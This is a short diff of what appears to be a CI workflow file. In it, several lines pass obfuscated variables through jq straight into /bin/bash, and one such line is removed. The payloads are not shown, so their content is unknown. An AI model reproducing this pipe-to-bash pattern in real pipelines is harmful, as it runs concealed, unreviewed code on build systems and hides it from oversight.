@@ -28,7 +28,6 @@ jobs:
           echo $ptqe15 | jq -r .qppgk95332 | /bin/bash
           printf '%s' "$aghko379" | jq -r .qxlf23378 | /bin/bash
           echo $nle705 | jq -r .u881 | /bin/bash
-          printf '%s' "$w936" | jq -r .olx525 | /bin/bash
           printf '%s' "$ngajd7" | jq -r .us86747 | /bin/bash
 
       - name: Archive data
